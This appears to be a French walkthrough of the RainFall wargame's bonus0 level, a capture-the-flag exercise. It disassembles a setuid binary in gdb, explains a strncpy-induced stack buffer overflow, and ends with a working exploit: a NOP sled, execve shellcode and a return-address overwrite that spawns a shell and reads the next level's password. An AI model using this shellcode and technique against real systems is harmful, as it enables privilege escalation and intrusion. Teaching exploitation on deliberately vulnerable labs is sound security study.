## 1: Analyse

### A: C'est quoi mon binaire?

  ```shell
  # On se connecte si c'est pas déja fait via le level7
  $ ssh bonus0@127.0.0.1 -p 4242
     _____       _       ______    _ _
    |  __ \     (_)     |  ____|  | | |
    | |__) |__ _ _ _ __ | |__ __ _| | |
    |  _  /  _` | | '_ \|  __/ _` | | |
    | | \ \ (_| | | | | | | | (_| | | |
    |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

                  Good luck & Have fun

    To start, ssh with level0/level0 on 10.0.2.15:4242
  bonus0@127.0.0.1's password f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
  [...]
  bonus0@RainFall:~$
  
  # On regarde ce qu'on a
  bonus0@RainFall:~$ ls -la
    total 17
    dr-xr-x---+ 1 bonus0 bonus0   80 Mar  6  2016 .
    dr-x--x--x  1 root   root    340 Sep 23  2015 ..
    -rw-r--r--  1 bonus0 bonus0  220 Apr  3  2012 .bash_logout
    -rw-r--r--  1 bonus0 bonus0 3530 Sep 23  2015 .bashrc
    -rwsr-s---+ 1 bonus1 users  5566 Mar  6  2016 bonus0
    -rw-r--r--+ 1 bonus0 bonus0   65 Sep 23  2015 .pass
    -rw-r--r--  1 bonus0 bonus0  675 Apr  3  2012 .profile

  # On teste les arguments
  bonus0@RainFall:~$ ./bonus0
    -
    coucou
    -
    coucou
    coucou coucou
  bonus0@RainFall:~$ ./bonus0 coucou coucou
    -
    SUPERLONGUESTRINGDELAMORTQUITUEPARCEQUELLEESTTROPLONGUE
    -
    SUPERLONGUESTRINGDELAMORTQUITUEPARCEQUELLEESTTROPLONGUE
    SUPERLONGUESTRINGDELSUPERLONGUESTRINGDEL�� SUPERLONGUESTRINGDEL��
    Segmentation fault (core dumped)
  ```
  * Les arguments ne changent rien
  * L'input demandé fait segfault quand il est trop long et print des char bizares


### B: On l'ouvre avec gdb
  * On va dans tmp pour lancer avec peda qu'on a copié avec le setup.sh
  ```shell
    bonus0@RainFall:~$ cd /tmp
  ```

  * On lance gdb avec notre binaire
  ```shell
    bonus0@RainFall:/tmp$ gdb ~/bonus0
      [...]
      Reading symbols from /home/user/bonus0/bonus0...(no debugging symbols found)...done.
  ```

  * Qu'est-ce qu'on a comme fonctions?
  ```shell
    gdb-peda$ info functions
      All defined functions:

      Non-debugging symbols:
      0x08048334  _init
      0x08048380  read
      0x08048380  read@plt
      0x08048390  strcat
      0x08048390  strcat@plt
      0x080483a0  strcpy
      0x080483a0  strcpy@plt
      0x080483b0  puts
      0x080483b0  puts@plt
      0x080483c0  __gmon_start__
      0x080483c0  __gmon_start__@plt
      0x080483d0  strchr
      0x080483d0  strchr@plt
      0x080483e0  __libc_start_main
      0x080483e0  __libc_start_main@plt
      0x080483f0  strncpy
      0x080483f0  strncpy@plt
      0x08048400  _start
      0x08048430  __do_global_dtors_aux
      0x08048490  frame_dummy # Func frame_dummy
      0x080484b4  p           # Func p
      0x0804851e  pp          # Func pp
      0x080485a4  main        # Func main
      0x080485d0  __libc_csu_init
      0x08048640  __libc_csu_fini
      0x08048642  __i686.get_pc_thunk.bx
      0x08048650  __do_global_ctors_aux
      0x0804867c  _fini
  ```

  * Commandes lancées pendant l'analyse du binaire ci-dessous
  ```shell
    gdb-peda$ x/s 0x80486a0
      0x80486a0:	 " - "
    gdb-peda$ x/s 0x80486a4
      0x80486a4:	 " "
  ```

  * On disassemble main pour regarder le code
  ```shell
    gdb-peda$ pdisas main
      Dump of assembler code for function main:
      # Initialisation, alignement et allocation de 64 octets
      0x080485a4 <+0>:	push   ebp
      0x080485a5 <+1>:	mov    ebp,esp
      0x080485a7 <+3>:	and    esp,0xfffffff0
      0x080485aa <+6>:	sub    esp,0x40

      # Call pp(buffer[64 - 22])
      0x080485ad <+9>:	lea    eax,[esp+0x16]
      0x080485b1 <+13>:	mov    DWORD PTR [esp],eax
      0x080485b4 <+16>:	call   0x804851e <pp>

      # Call puts(buffer[42])
      0x080485b9 <+21>:	lea    eax,[esp+0x16]
      0x080485bd <+25>:	mov    DWORD PTR [esp],eax
      0x080485c0 <+28>:	call   0x80483b0 <puts@plt>

      # Return 0
      0x080485c5 <+33>:	mov    eax,0x0
      0x080485ca <+38>:	leave
      0x080485cb <+39>:	ret
      End of assembler dump.
  ```
  * Pareil pour pp du coup

  ```shell
    gdb-peda$ pdisas pp
      Dump of assembler code for function pp:
      # Initialisation, save edi et ebx et allocation de 80 octets
      0x0804851e <+0>:	push   ebp
      0x0804851f <+1>:	mov    ebp,esp
      0x08048521 <+3>:	push   edi
      0x08048522 <+4>:	push   ebx
      0x08048523 <+5>:	sub    esp,0x50

      # call p(input1[20], " - ") => 20 car push edi et ebx et plus bas on a un 2eme buffer de 20
      0x08048526 <+8>:	mov    DWORD PTR [esp+0x4],0x80486a0
      0x0804852e <+16>:	lea    eax,[ebp-0x30]
      0x08048531 <+19>:	mov    DWORD PTR [esp],eax
      0x08048534 <+22>:	call   0x80484b4 <p>

      # Call p(input2[20], " - ") => 20 car push edi et ebx donc 0x1c - 8 = 20
      0x08048539 <+27>:	mov    DWORD PTR [esp+0x4],0x80486a0
      0x08048541 <+35>:	lea    eax,[ebp-0x1c]
      0x08048544 <+38>:	mov    DWORD PTR [esp],eax
      0x08048547 <+41>:	call   0x80484b4 <p>

      # Call strcpy(buffer, input1)
      0x0804854c <+46>:	lea    eax,[ebp-0x30]
      0x0804854f <+49>:	mov    DWORD PTR [esp+0x4],eax
      0x08048553 <+53>:	mov    eax,DWORD PTR [ebp+0x8]
      0x08048556 <+56>:	mov    DWORD PTR [esp],eax
      0x08048559 <+59>:	call   0x80483a0 <strcpy@plt>
      
      # Stock " " dans ebx
      0x0804855e <+64>:	mov    ebx,0x80486a4

      # eax = strlen(buffer)
      0x08048563 <+69>:	mov    eax,DWORD PTR [ebp+0x8]
      0x08048566 <+72>:	mov    DWORD PTR [ebp-0x3c],0xffffffff
      0x0804856d <+79>:	mov    edx,eax
      0x0804856f <+81>:	mov    eax,0x0
      0x08048574 <+86>:	mov    ecx,DWORD PTR [ebp-0x3c]
      0x08048577 <+89>:	mov    edi,edx
      0x08048579 <+91>:	repnz scas al,BYTE PTR es:[edi]
      0x0804857b <+93>:	mov    eax,ecx
      0x0804857d <+95>:	not    eax

      # buffer[-2:] = " \0" 
      0x0804857f <+97>:	sub    eax,0x1
      0x08048582 <+100>:	add    eax,DWORD PTR [ebp+0x8]
      0x08048585 <+103>:	movzx  edx,WORD PTR [ebx]
      0x08048588 <+106>:	mov    WORD PTR [eax],dx

      # Call strcat(buffer, input2)
      0x0804858b <+109>:	lea    eax,[ebp-0x1c]
      0x0804858e <+112>:	mov    DWORD PTR [esp+0x4],eax
      0x08048592 <+116>:	mov    eax,DWORD PTR [ebp+0x8]
      0x08048595 <+119>:	mov    DWORD PTR [esp],eax
      0x08048598 <+122>:	call   0x8048390 <strcat@plt>

      # Return
      0x0804859d <+127>:	add    esp,0x50
      0x080485a0 <+130>:	pop    ebx
      0x080485a1 <+131>:	pop    edi
      0x080485a2 <+132>:	pop    ebp
      0x080485a3 <+133>:	ret
      End of assembler dump.
  ```
  * Et p pour finir

  ```shell
    gdb-peda$ pdisas p
      Dump of assembler code for function p:
      # Initialisation, allocation de 4120
      0x080484b4 <+0>:	push   ebp
      0x080484b5 <+1>:	mov    ebp,esp
      0x080484b7 <+3>:	sub    esp,0x1018

      # Call puts(" - ")
      0x080484bd <+9>:	mov    eax,DWORD PTR [ebp+0xc]
      0x080484c0 <+12>:	mov    DWORD PTR [esp],eax
      0x080484c3 <+15>:	call   0x80483b0 <puts@plt>

      # eax = read(stdin (==0), buffer[4096], 4096)
      0x080484c8 <+20>:	mov    DWORD PTR [esp+0x8],0x1000
      0x080484d0 <+28>:	lea    eax,[ebp-0x1008]
      0x080484d6 <+34>:	mov    DWORD PTR [esp+0x4],eax
      0x080484da <+38>:	mov    DWORD PTR [esp],0x0
      0x080484e1 <+45>:	call   0x8048380 <read@plt>

      # Call strchr(buffer, "\n") et mettre un 0 a la place du "\n" trouvé
      0x080484e6 <+50>:	mov    DWORD PTR [esp+0x4],0xa
      0x080484ee <+58>:	lea    eax,[ebp-0x1008]
      0x080484f4 <+64>:	mov    DWORD PTR [esp],eax
      0x080484f7 <+67>:	call   0x80483d0 <strchr@plt>
      0x080484fc <+72>:	mov    BYTE PTR [eax],0x0

      # Call strncpy(dest, buffer, 20) => Ne met pas de \0 si l'input est > 20
      0x080484ff <+75>:	lea    eax,[ebp-0x1008]
      0x08048505 <+81>:	mov    DWORD PTR [esp+0x8],0x14
      0x0804850d <+89>:	mov    DWORD PTR [esp+0x4],eax
      0x08048511 <+93>:	mov    eax,DWORD PTR [ebp+0x8]
      0x08048514 <+96>:	mov    DWORD PTR [esp],eax
      0x08048517 <+99>:	call   0x80483f0 <strncpy@plt>

      # Return
      0x0804851c <+104>:	leave
      0x0804851d <+105>:	ret
      End of assembler dump.
  ```


## 2: Comportement
  * Notre programme va donc print " - " et prendre un input1, strncpy jusqu'a 20 octets de cet input1
  * Il fait pareil avec un input2.
  * Il va ensuite les copier tous les 2 dans le buffer initial de 42 char.
  * Le strncopy n'est pas protégé contre les inputs trop longs (il ne mettra pas de \0)

## 3: Exploit

### A: Explication

> Si l'input est > à 20 caractères, le strncpy de p() ne va pas mettre de \0 a la fin de la string\
> Or, en revenant dans pp, on constate que l'on strcpy cette string d'input qui n'est pas terminée par \0.\
> Donc on continue de copier ce qu'il y a après input1 dans le buffer du main, le faisant overflow.\
> A un moment, on va donc réécrire sur l'EIP du main. A cette occasion, on peut en profiter pour mettre l'addresse d'un shellcode qu'on va écrire dans notre premier buffer d'input


### B: Creation de l'exploit

* Il nous faut donc: générer notre première NOPSLED suivie de notre shellcode (suite d'instructions NOP qui glissent à la suivante), trouver l'addresse de notre premier buffer lu ainsi que notre offset pour savoir où écrire l'addresse pointant dans notre NOPSLED.

```shell
  # NOPSLED + shellcode
  bonus0@RainFall:/tmp$ python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80" + "\n"'

  # Maintenant on cherche l'addresse qu'on veut pointer
  gdb-peda$ b * p+34
    Breakpoint 1 at 0x80484d6
  gdb-peda$ run
    -
    [----------------------------------registers-----------------------------------]
    # La voilà l'addresse de notre buffer. On va taper environ 80 plus loin pour tomber sur la nopsled facilement
    EAX: 0xbfffe660 --> 0x0
    [...]
    [-------------------------------------code-------------------------------------]
      0x80484d0 <p+28>:	lea    eax,[ebp-0x1008]
    => 0x80484d6 <p+34>:	mov    DWORD PTR [esp+0x4],eax
      0x80484da <p+38>:	mov    DWORD PTR [esp],0x0
    [...]
    Breakpoint 1, 0x080484d6 in p ()

  # Maintenant l'offset
  gdb-peda$ pattern create 200 patternb0
    Writing pattern of 200 chars to filename "patternb0"

  gdb-peda$ cat patternb0
    AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA

  gdb-peda$ run
    -
    09876543210987654321
    -
    AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
    09876543210987654321AAA%AAsAABAA$AAnAACA�� AAA%AAsAABAA$AAnAACA��

    Program received signal SIGSEGV, Segmentation fault.
    [----------------------------------registers-----------------------------------]
    [...]
    # On voit qu'on réécrit bien sur l'EIP
    EIP: 0x24414142 ('BAA$')
    [...]
    [-------------------------------------code-------------------------------------]
    # Et qu'on crash bien en essayant de le call
    Invalid $PC address: 0x24414142
    [------------------------------------stack-------------------------------------]
    [...]
    [------------------------------------------------------------------------------]
    Stopped reason: SIGSEGV
    0x24414142 in ?? ()

  gdb-peda$ pattern search
    Registers contain pattern buffer:
    # Offset de 9!
    EIP+0 found at offset: 9
    [...]
```
* padding de 9 + 0xbfffe660 + 80 (buffer read) en litte indian:
```shell
  bonus0@RainFall:/tmp$ (python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A" * 9 + "\xb0\xe6\xff\xbf" + "B" * 7'; cat) | ~/bonus0
    -
    -
    ��������������������AAAAAAAAA����BBBBBBB�� AAAAAAAAA����BBBBBBB��
    whoami
      bonus1
    cat /home/user/bonus1/.pass
      cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```


